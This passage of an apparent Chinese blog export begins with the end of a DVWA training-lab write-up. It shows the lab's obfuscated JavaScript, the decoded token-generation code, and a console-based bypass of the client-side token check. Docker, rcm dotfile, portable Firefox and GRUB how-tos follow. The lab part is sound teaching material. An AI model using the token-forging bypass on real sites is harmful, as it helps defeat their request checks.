class="string">&#x27;0x3&#x27;</span>))&#123;<span class="keyword">return</span> i[k];&#125;<span class="keyword">else</span>&#123;<span class="keyword">while</span>(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[<span class="function"><span class="keyword">function</span>(<span class="params">l</span>)</span>&#123;<span class="keyword">return</span> i[l];&#125;];k=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> b(<span class="string">&#x27;0x4&#x27;</span>);&#125;;f=<span class="number">0x1</span>;&#125;&#125;];h=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> b(<span class="string">&#x27;0x4&#x27;</span>);&#125;;f=<span class="number">0x1</span>;&#125;;<span class="keyword">while</span>(f--)&#123;<span class="keyword">if</span>(g[f])&#123;<span class="keyword">if</span>(b(<span class="string">&#x27;0x5&#x27;</span>)===b(<span class="string">&#x27;0x6&#x27;</span>))&#123;<span class="keyword">return</span> i[h];&#125;<span class="keyword">else</span>&#123;d=d[b(<span class="string">&#x27;0x2&#x27;</span>)](<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span>+h(f)+<span class="string">&#x27;\x5cb&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),g[f]);&#125;&#125;&#125;<span class="keyword">return</span> d;&#125;(b(<span class="string">&#x27;0x7&#x27;</span>),<span class="number">0x3e</span>,<span class="number">0x137</span>,b(<span class="string">&#x27;0x8&#x27;</span>)[b(<span class="string">&#x27;0x9&#x27;</span>)](<span class="string">&#x27;|&#x27;</span>),<span class="number">0x0</span>,&#123;&#125;));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>high.js</code> 代码明显被混淆了，使用<a href="http://deobfuscatejavascript.com">工具解码</a> 得到有用代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
<p>生成 <code>token</code> 的步骤是: <code>token_part_1(&quot;ABCD&quot;,44)</code> &gt;&gt; <code>token_part_2(&quot;XX&quot;)</code> &gt;&gt; <code>token_part_3</code></p>
<h3 id="漏洞利用-41"><a href="#漏洞利用-41" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在输入框输入 <code>success</code> 后到控制台输入 <code>token_part_1(&quot;ABCD&quot;,44)</code> 和 <code>token_part_2(&quot;XX&quot;)</code> 两个函数即可。</p>
<h2 id="Impossible-13"><a href="#Impossible-13" class="headerlink" title="Impossible"></a>Impossible</h2><p>永远不要相信用户提交的信息，所以没有不可能级别。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>DockerHub加速</title>
    <url>/posts/e4bc92fe/</url>
    <content><![CDATA[<h1 id="DockerHub国内加速地址"><a href="#DockerHub国内加速地址" class="headerlink" title="DockerHub国内加速地址"></a>DockerHub国内加速地址</h1><div class="table-container">
<table>
<thead>
<tr>
<th>加速地址</th>
<th>是否专属</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://registry.docker-cn.com">Docker中国官方</a>: <code>https://registry.docker-cn.com</code></td>
<td>否</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://daocloud.io/mirror">DaoCloud</a>: <code>http://f1361db2.m.daocloud.io</code></td>
<td>是,可登录，系统分配</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://dockerhub.azk8s.cn">Azure</a>: <code>https://dockerhub.azk8s.cn</code></td>
<td>否</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://docker.mirrors.ustc.edu.cn">中国科技大学</a> : <code>https://docker.mirrors.ustc.edu.cn</code></td>
<td>否</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://cr.console.aliyun.com/">阿里</a>: <code>https://&lt;your_code&gt;.mirror.aliyuncs.com</code></td>
<td>是，登录获取专属地址</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://reg-mirror.qiniu.com">七牛</a>: <code>https://reg-mirror.qiniu.com</code></td>
<td>否</td>
<td>Docker Hub、GCR、Quay</td>
</tr>
<tr>
<td><a href="https://hub-mirror.c.163.com">网易</a>: <code>https://hub-mirror.c.163.com</code></td>
<td>否</td>
<td>Docker Hub</td>
</tr>
<tr>
<td><a href="https://mirror.ccs.tencentyun.com">腾讯</a>: <code>https://mirror.ccs.tencentyun.com</code></td>
<td>否</td>
<td>Docker Hub</td>
</tr>
</tbody>
</table>
</div>
<a id="more"></a>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>创建或修改 <code>/etc/docker/daemon.json</code> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;地址，多条用逗号(,)隔开&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<p>重新加载守护进程配置和重启Docker</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://juejin.im/post/5cd2cf01f265da0374189441">Docker Hub 镜像加速器</a></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker容器中使用systemctl报错</title>
    <url>/posts/dcd841b9/</url>
    <content><![CDATA[<h1 id="当在Dokcer容器中使用systemctl时报以下错误"><a href="#当在Dokcer容器中使用systemctl时报以下错误" class="headerlink" title="当在Dokcer容器中使用systemctl时报以下错误"></a>当在Dokcer容器中使用<code>systemctl</code>时报以下错误</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System has not been booted with systemd as init system (PID 1). Can&#39;t operate.</span><br><span class="line">Failed to connect to bus: Host is down&#39;</span><br></pre></td></tr></table></figure>
<h1 id="问题原因："><a href="#问题原因：" class="headerlink" title="问题原因："></a>问题原因：</h1><p>启动容器时执行的启动是<code>/bin/bash</code>,没有相应的权限调用内核程序，需要在<code>run</code>修改相应的指令获得权限</p>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>在<code>run</code>指令后加—privileged=true，修改<code>/bin/bash</code> 为<code>/sbin/init</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --privileged=<span class="literal">true</span> -itd xxxxx /sbin/init</span><br></pre></td></tr></table></figure>
<p>进入容器时使用的是<code>docker exec -it xxxxx /bin/bash</code></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Dotfile管理</title>
    <url>/posts/fc38e44e/</url>
    <content><![CDATA[<p>在Linux上各个程序的配置文件大多是以 <code>.</code> 开头或以 <code>rc</code> 结尾的文件，并存放于用户的个人目录 <code>~/</code> 中，通常叫dotfile 或 rc file ，如 <code>.zshrc</code> ，<code>.vimrc</code> 等。在初次使用一些软件时需要花大量时间对相应的 dotfile 进行配置，当需要在新系统上恢复多个软件配置或者在多台电脑上共享一台电脑对 dotfile 的修改时，逐一对各个 dotfile 进行管理非常不方便,<code>rcm</code>(rc file management) 就是一个 dotfile 管理工具,用于方便管理 dotfile 。</p>
<p>rcm 主要是将所有希望用 rcm 管理的 dotfile 集中存储在一个目录中（默认 <code>~/.dotfiles</code>），并在原配置文件位置创建被 rcm 管理的 dotfile 的软链接。</p>
<p>可在该集中存储目录中使用 git 进行版本控制，同时也可托管到 github 等 git 仓库中方便多台机器共享。若要使用别人分享的 rcm 目录下的 dotfile 时 rcm 可调用不同 dotfiles 目录下的文件进行使用。</p>
<p><a href="https://github.com/thoughtbot/rcm">rcm github仓库</a></p>
<p><a href="https://gitee.com/mirrors/rcm">rcm gitee国内加速仓库</a></p>
<a id="more"></a>
<h1 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h1><p>rcm 包括了 4 个命令和一个 dotfile 文件 <code>~/.rcrc</code> (注意 rcm 默认不会生成该配置文件，若要使用需手动创建）</p>
<h2 id="lsrc"><a href="#lsrc" class="headerlink" title="lsrc"></a>lsrc</h2><p><strong>列出当前所有通过 rcm 管理的 dotfile ，以及其对应的符号链接位置</strong></p>
<p><code>lsrc    [-FhqVv] [-B HOSTNAME] [-d DIR] [-I EXCL_PAT] [-S EXCL_PAT] [-s EXCL_PAT] [-t TAG] [-U EXCL_PAT] [-u EXCL_PAT] [-x EXCL_PAT] [files ...]</code></p>
<h2 id="mkrc"><a href="#mkrc" class="headerlink" title="mkrc"></a>mkrc</h2><p>将指定的 dotfile 移动至集中存储目录(默认 <code>~/.dotfiles</code>)，并在原下创建相应的软链接</p>
<p><code>mkrc    [-ChoqSsVvUu] [-t TAG] [-d DIR] [-B HOSTNAME] files ...</code></p>
<h2 id="rcup"><a href="#rcup" class="headerlink" title="rcup"></a>rcup</h2><p>更新或创建由 rcm 管理的 dotfile 的软链接</p>
<p><code>rcup    [-CfhiKkqVv] [-B HOSTNAME] [-d DIR] [-g] [-I EXCL_PAT] [-S EXCL_PAT] [-s EXCL_PAT] [-t TAG] [-U EXCL_PAT] [-u EXCL_PAT] [-x EXCL_PAT] [files ...]</code></p>
<h2 id="rcdn"><a href="#rcdn" class="headerlink" title="rcdn"></a>rcdn</h2><p>删除通过 rcm 创建的 dotfile 的软链接</p>
<p><code>rcdn    [-hKkqVv] [-B HOSTNAME] [-d DIR] [-I EXCL_PAT] [-S EXCL_PAT] [-s EXCL_PAT] [-t TAG] [-U EXCL_PAT] [-u EXCL_PAT] [-x EXCL_PAT] [files ...]</code></p>
<h1 id="命令指令"><a href="#命令指令" class="headerlink" title="命令指令"></a>命令指令</h1><ul>
<li><code>-B HOSTNAME</code>: 指定特定主机的目录,而不是使用计算机的主机名对其进行操作。</li>
<li><code>-C</code>: 复制文件而不是创建软链接。</li>
<li><code>-d DIR</code>: 指定 dotfiles 目录，可以指定多个。</li>
<li><code>-F</code>: 在文件旁显示指示符号，<code>@</code> (文件软链接) ，<code>$</code> (目录软链接)，<code>x</code>(副本文件)。更多详细信息参考 rcrc 中的 <code>COPY_ALWAYS</code> 和 <code>SYMLINK_DIRS</code> 。</li>
<li><code>-f</code>: 如果rc文件已经存在于配置目录中，但与 dotfiles 目录中的文件不匹配，删除rc文件，然后创建软链接。</li>
<li><code>-g</code>: 仅显示 <code>rcup</code> 命令脚本的执行过程，不会修改文件系统上的任何内容。</li>
<li><code>-h</code>: 显示用法说明</li>
<li><code>-I EXCL_PAT</code>: 指定不被 <code>-x</code> 排除的文件。 该项在 <code>-x</code> 选项之后应用,使用与 <code>-x</code> 相同的语法格式。可能需要用引号使其不被 Shell 忽略。更多详细信息参考 <code>EXCLUDE PATTERN</code>。</li>
<li><code>-i</code>: 如果rc文件已经存在于配置目录中，但是与dotfiles目录中的文件不匹配，提示如何处理它。这是默认选项。</li>
<li><code>-K</code>: 跳过 pre-hooks 和 post-hooks</li>
<li><code>-k</code>: 运行 pre-hooks 和 post-hooks , 这是默认选项。</li>
<li><code>-o</code>: 将 dotfiles 安装到主机特定的目录中。</li>
<li><code>-q</code>: 减少详细信息。更多详细信息参考 <code>DIRECTORY LAYOUT</code>。</li>
<li><code>-S EXCL_PAT</code>: 指定以软链接形式创建的目录。此选项可重复使用，需要用引号使其不被 Shell 忽略。更多详细信息参考 <code>EXCLUDE PATTERN</code>。</li>
<li><code>-s EXCL_PAT</code>: 指定递归创建的目录而不是软链接式的目录。与 <code>-S</code> 选项相反，可用于撤消它或 <code>rcrc</code> 中的 <code>SYMLINK_DIRS</code> 设置。 此选项可重复使用，需要用引号使其不被 Shell 忽略。更多详细信息参考 <code>EXCLUDE PATTERN</code>。</li>
<li><code>-t TAG</code>: 指定标签</li>
<li><code>-U EXCLUDE</code>: 指定不创建软链接和以点 (<code>.</code>) 开头命名的rc文件或目录。此选项可重复使用，需要用引号使其不被 Shell 忽略。更多详细信息参考 <code>EXCLUDE PATTERN</code>。</li>
<li><code>-u EXCL_PAT</code>: 指定必须使用点 (<code>.</code>) 开头命名的 rc 文件或目录。 与 <code>-U</code> 选项相反，可用于撤消它或 rcrc 中 <code>UNDOTTED</code> 设置。 此选项可重复使用，需要用引号使其不被 Shell 忽略。更多详细信息参考 <code>EXCLUDE PATTERN</code>。</li>
<li><code>-V</code>: 显示版本号。</li>
<li><code>-v</code>: 添加详细信息。 可以重复此操作以获取更多的详细信息。</li>
<li><code>-x EXCL_PAT</code>: 指定排除的文件。此选项可重复使用，需要用引号使其不被 Shell 忽略。更多详细信息参考 <code>EXCLUDE PATTERN</code>。</li>
<li><code>files ...</code>: 指定的文件列表。</li>
</ul>
<h1 id="rcrc"><a href="#rcrc" class="headerlink" title="~/.rcrc"></a><code>~/.rcrc</code></h1><p>可以使用主目录中的 <code>.rcrc</code> 文件配置rcm dotfile 管理器。 可通过设置 <code>RCRC</code> 环境变量来更改此位置。</p>
<p>支持以下变量:</p>
<ul>
<li><code>COPY_ALWAYS</code>: 复制列表中的glob相匹配的文件，而非使用软链接。</li>
<li><code>DOTFILES_DIRS</code>: dotfile 的源目录。列表中的第一个将被 <code>mkrc</code> 用于创建 <code>dotfile</code> 目录，默认值为: <code>~/.dotfiles</code> 。</li>
<li><code>EXCLUDES</code>: 排除列表。</li>
<li><code>HOSTNAME</code>: 计算机的主机名。 通常通过 <code>hostname</code> 命令获得，但此命令并非标准的，获取的主机名或许会有差异，因此使用 <code>HOSTNAME</code> 变量强制使用已知的主机名。</li>
<li><code>TAGS</code>: 默认标签表。</li>
<li><code>SYMLINK_DIRS</code>: 列表中目录是软链接，而不是源文件。 </li>
<li><code>UNDOTTED</code>: 列表中的文件是软链接且不用点 (<code>.</code>) 开头命名。如果是 <code>SYMLINK_DIRS</code> 中含有的目录，则该目录将为软链接且不用点 (<code>.</code>) 开头命名。</li>
</ul>
<p><strong><code>.rcrc</code> 样例</strong>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">COPY_ALWAYS=<span class="string">&quot;ssh/id_* weechat/* netrc&quot;</span></span><br><span class="line">COPY_ALWAYS=<span class="string">&quot;*&quot;</span></span><br><span class="line">DOTFILES_DIRS=<span class="string">&quot;/home/mike/.dotfiles /usr/share/dotfiles&quot;</span></span><br><span class="line">EXCLUDES=<span class="string">&quot;irbrc *:*emacs* dotfiles:python*&quot;</span></span><br><span class="line">HOSTNAME=<span class="string">&quot;eggplant&quot;</span></span><br><span class="line">TAGS=<span class="string">&quot;freebsd development email git laptop gmail notmuch&quot;</span></span><br><span class="line">SYMLINK_DIRS=<span class="string">&quot;zprezto texmf&quot;</span></span><br><span class="line">UNDOTTED=<span class="string">&quot;texmf&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="EXCLUDE-PATTERN-排除列表"><a href="#EXCLUDE-PATTERN-排除列表" class="headerlink" title="EXCLUDE PATTERN (排除列表)"></a>EXCLUDE PATTERN (排除列表)</h1><p>使用冒号 (<code>:</code>) 分隔 dotfile 目录和 glob (由普通字符、通配字符组成的字符串，用于匹配文件路径) 。可选择带 dotfile 目录，如果省略则默认为 <code>*</code> ，代表从所有 dotfile 目录匹配。 glob 是相对于 dotfile 目录的相对路径。</p>
<p>例如，要忽略 <code>Thoughtbot-dotfiles</code> 目录中所有与 <code>emacs</code> 相关的项目，使用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">thoughtbot-dotfiles:*emacs*</span><br></pre></td></tr></table></figure>
<p>要忽略所有 <code>bash_profile</code> 文件使用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">*:bash_profile</span><br></pre></td></tr></table></figure>
<p>或者简写为:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash_profile</span><br></pre></td></tr></table></figure>
<p>注意,通常通过 <code>hostname</code> 命令获得主机名，但此命令并非标准的，获取的主机名或许会有差异，在macOS上，主机名是不可预测的，甚至可能在 <code>DHCP</code> 握手被更改,强烈建议在 <code>rcrc</code> 中,因此使用 <code>HOSTNAME</code> 变量强制使用已知的主机名。</p>
<h1 id="DIRECTORY-LAYOUT-目录布局"><a href="#DIRECTORY-LAYOUT-目录布局" class="headerlink" title="DIRECTORY LAYOUT (目录布局)"></a>DIRECTORY LAYOUT (目录布局)</h1><p>dotfiles 目录下的任何非点 (<code>.</code>) 开头的、非元的文件或目录都将作为点 (<code>.</code>) 开头的文件安装。 例如，<code>.dotfiles/zshrc</code> 将安装到 <code>~/.zshrc</code> 。</p>
<p>文件安装为软链接。 目录通过建立目录来安装。<code>-C</code> 选项指定文件通过复制安装而不是软链接。 <code>rcrc</code> 中的 <code>COPY_ALWAYS</code> 可用于列出只能复制的文件。</p>
<p>支持三个元文件: host-specific (特定主机文件), tagged (标记文件), hooks 。</p>
<ul>
<li><code>host-specific</code>: 以 <code>host-</code> 前缀加主机名命名的目录，存放特定主机的文件，如，<code>.dotfiles/host-scarlett</code> 包含主机名为 scarlett 的计算机 dotfile 文件，且这些文件将仅安装在主机名为scarlett的计算机上。</li>
<li><code>tagged</code>: 以 <code>tag-</code> 前缀加标签名命名的目录，存放标记该标签的文件，如，仅在指定使用 <code>git</code> 标签时安装 <code>.dotfiles/tag-git</code> 下的文件。</li>
<li><code>hooks</code>:  名为hooks的目录，存放 hooks 。 rcup 支持两个hooks：<code>pre-up</code> 和 <code>post-up</code> 。它们存放到预设文件名的文件或目录中：<code>.dotfiles/hooks/pre-up</code> 和 <code>.dotfiles/hooks/post-up</code> ，或 <code>.dotfiles/hooks/pre-up/*</code> 和 <code>.dotfiles/hooks/post-up/*</code> 。 这些文件必须是可执行文件。 它们在每次 <code>rcup</code> 运行时都运行，因此必须是幂等(执行后结果还为本身)的。hooks 按字母顺序排序,一次只执行一次。 如，<code>hooks/pre-up/animals</code> 将在 <code>hooks / pre-up/aquariums</code> 之前运行，<code>hooks/pre-up/4-eyes</code> 将在 <code>hooks/post-up/2-u-nothing-compares</code> 之前运行。</li>
</ul>
<h1 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a>日常使用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建管理</span></span><br><span class="line">mkrc xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打标签方式创建管理</span></span><br><span class="line">mkrc -t git xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 dotfiles 中的 dotfile 文件</span></span><br><span class="line">rcup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装指定标签的 dotfile 文件</span></span><br><span class="line">rcup -t git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装指定标签的 dotfile 文件，并显示过程</span></span><br><span class="line">rcup -t git -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询被管理的 dotfile 文件</span></span><br><span class="line">lsrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定标签的 dotfile 文件</span></span><br><span class="line">lsrc -t git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定 dotfiles 中的 dotfile 文件</span></span><br><span class="line">lsrc -d ~/.MyDotfiles</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消安装</span></span><br><span class="line">rcdn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消指定标签的安装，并显示过程</span></span><br><span class="line">rcdn -t git -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消指定 dotfiles 中指定标签的安装</span></span><br><span class="line">rcdn -d ~/.MyDotfiles -t git</span><br></pre></td></tr></table></figure>
<p><strong>使用git进行版本管理及云备份</strong>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.dotfiles</span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;These are my dotfiles&quot;</span> &gt;&gt; README.md</span><br><span class="line">git commit -m <span class="string">&quot;initial commit&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://thoughtbot.github.io/rcm/rcm.7.html">RCM(7)</a></p>
<p><a href="https://www.jianshu.com/p/e21089d118c1">管理linux下软件的配置文件dotfile(rc files)</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Firefox便捷版制作</title>
    <url>/posts/abb290b8/</url>
    <content><![CDATA[<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul>
<li><p>地址栏输入 <code>about:profiles</code> 打开配置文件保存目录，存有 <code>.default</code> 后缀的目录为配置文件目录。</p>
</li>
<li><p>也可直接访问，<code>%APPDATA%\Mozilla\Firefox\Profiles\</code> 进入配置文件保存目录。</p>
</li>
</ul>
<a id="more"></a>
<h2 id="Mac-OS"><a href="#Mac-OS" class="headerlink" title="Mac OS"></a>Mac OS</h2><p><code>Library</code> (资源库) 下的 <code>Application Support</code> 文件夹 &gt;&gt; <code>Firefox</code> 文件夹 &gt;&gt; Profiles &gt;&gt; 以 <code>.default</code></p>
<h2 id="配置文件信息"><a href="#配置文件信息" class="headerlink" title="配置文件信息"></a>配置文件信息</h2><ul>
<li><code>places.sqlite</code> : 书签、下载历史和浏览历史，<code>bookmarkbackups</code> 文件夹中存储着书签备份文件，可用于恢复书签</li>
<li><code>key3.db</code> 、 <code>logins.json</code> : 密码</li>
<li><code>permissions.sqlite</code> 、<code>content-prefs.sqlite</code> : 站点自定的首选项</li>
<li><code>search.jsom.mozlz4</code> : 搜索引擎</li>
<li><code>persdict.dat</code> : 用户词典</li>
<li><code>formhistory.sqlite</code> 自动完成历史</li>
<li><code>cookies.sqlite</code> : Cookie</li>
<li>DOM 存储: 比 Cookie 更强大安全易用的一种存储信息方式，每个站点的信息都被存储在 <code>webappsstore.sqlite</code> 文件中，而 <code>chromeappstore.sqlite</code> 存储着 <code>about:*</code> 页面的信息</li>
<li><code>extensions</code> : 扩展</li>
<li><code>cert8.db</code> : 安全证书设置</li>
<li><code>secmod.db</code> : 安全设备设置</li>
<li><code>mimeTypes.rdf</code> : 下载动作</li>
<li><code>pluginreg.dat</code> 插件 MIME 类型</li>
<li><code>sessionstore.js</code> : 保存的会话</li>
<li><code>xulstore.json</code> : 指导员工具栏</li>
<li><code>prefs.js</code> : 用户首选项</li>
</ul>
<p>这些文件会随着用户在火狐中的操作同步修改。</p>
<p>通过使用参数选项 <code>-profile</code> 设置使用启用的配置</p>
<ul>
<li>Windows 中可在快捷方式的 <code>属性</code> 里的 <code>目标</code> 最后添加参数,如 <code>&quot;C:\Program Files (x86)\Mozilla Firefox\firefox.exe&quot; -profile &quot;D:\Profile&quot;</code></li>
<li>Mac OS 可使用命令 <code>/Applications/Firefox.app/Contents/MacOS/firefox-bin -profile /home/Profile</code></li>
</ul>
<h1 id="制作便捷版火狐"><a href="#制作便捷版火狐" class="headerlink" title="制作便捷版火狐"></a>制作便捷版火狐</h1><ul>
<li>将火狐安装目录复制出来</li>
<li>将 <code>Profiles</code> 下的配置文件夹 (<code>.default</code> 结尾的目录) 复制到刚才复制出来的目录中，并命名为 <code>Profile</code></li>
<li><p>创建启动脚本</p>
<ul>
<li>Windows : <code>start &quot;&quot; &quot;firefox.exe&quot; -profile &quot;Profile&quot;</code> &gt;&gt; run.bat</li>
<li>MacOS : <code>./firefox-bin -profile ./Profile</code> &gt;&gt; run.sh</li>
</ul>
</li>
</ul>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><blockquote>
<p>|-Firefox/<br>|-|-firefox.exe(firefox-bin)<br>|-|-Profile/<br>|-|-run.bat(run.sh)</p>
</blockquote>
<p><strong>参考：<a href="https://zhuanlan.zhihu.com/p/24620052">关于配置文档以及如何制作便携版 Firefox</a></strong></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Firefox</tag>
      </tags>
  </entry>
  <entry>
    <title>Firefox切换本地与全球服务</title>
    <url>/posts/326bbe71/</url>
    <content><![CDATA[<p>为了解决国内用户连接 全球同步服务器 困难的问题，现在的火狐中国版推出了 全球服务 和 本地服务 两套服务。</p>
<pre><code>这两套服务的账号和数据并不通用，并且只有中国版提供了切换功能，因此当你在同步过程中遇到“未知账号”的提示，或者两台设备间数据无法同步的情况时，请尝试下述操作：

1. 安装最新的中国版火狐，因为只有中国版火狐内置了切换选项（详细）

2. 确保 [“附加组件管理器”](http://mozilla.com.cn/thread-343905-1-1.html) 扩展 处于启用状态

3. 查看和切换 当前使用的服务
</code></pre><p>参考：<a href="http://mozilla.com.cn/thread-330960-1-1.html">http://mozilla.com.cn/thread-330960-1-1.html</a></p>
]]></content>
      <tags>
        <tag>插件</tag>
      </tags>
  </entry>
  <entry>
    <title>GRUB主题美化</title>
    <url>/posts/950e06d6/</url>
    <content><![CDATA[<h2 id="下载主题包"><a href="#下载主题包" class="headerlink" title="下载主题包"></a>下载主题包</h2><p>到<a href="https://www.gnome-look.org/browse/cat/109/ord/rating/">gnome-look</a>下载喜欢的主题</p>
<p>我用的是：<a href="https://www.gnome-look.org/p/1009236/">Grub-theme-vimix</a></p>
<p><strong>解压主题包</strong></p>
<h2 id="使用主题包"><a href="#使用主题包" class="headerlink" title="使用主题包"></a>使用主题包</h2><h3 id="脚本方式安装"><a href="#脚本方式安装" class="headerlink" title="脚本方式安装"></a>脚本方式安装</h3><p>一些主题包内包含了一件安装脚本，只需运行就可安装使用该主题</p>
<h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>没有安装脚本的主题，或自定义的主题，需要自行手动安装</p>
<a id="more"></a>
<p><strong>将主题文件夹放到到GRUB主题目录下</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo cp  主题文件夹 /boot/grub/themes/</span><br></pre></td></tr></table></figure><br><strong>修改配置使用该主题</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/grub.d/00_header</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入配置内容</span></span><br><span class="line">GRUB_THEME=<span class="string">&quot;/boot/grub/themes/主题文件夹/theme.txt&quot;</span></span><br><span class="line"><span class="comment"># 设置分辨率 auto（自动） 1920x1080x32</span></span><br><span class="line"><span class="comment">#GRUB_GFXMODE=auto</span></span><br><span class="line">GRUB_GFXMODE=<span class="string">&quot;1920x1080x32&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="更新配置"><a href="#更新配置" class="headerlink" title="更新配置"></a>更新配置</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>GRUB</tag>
      </tags>
  </entry>
  <entry>
    <title>Git问题解决</title>
    <url>/posts/19e2ba1f/</url>
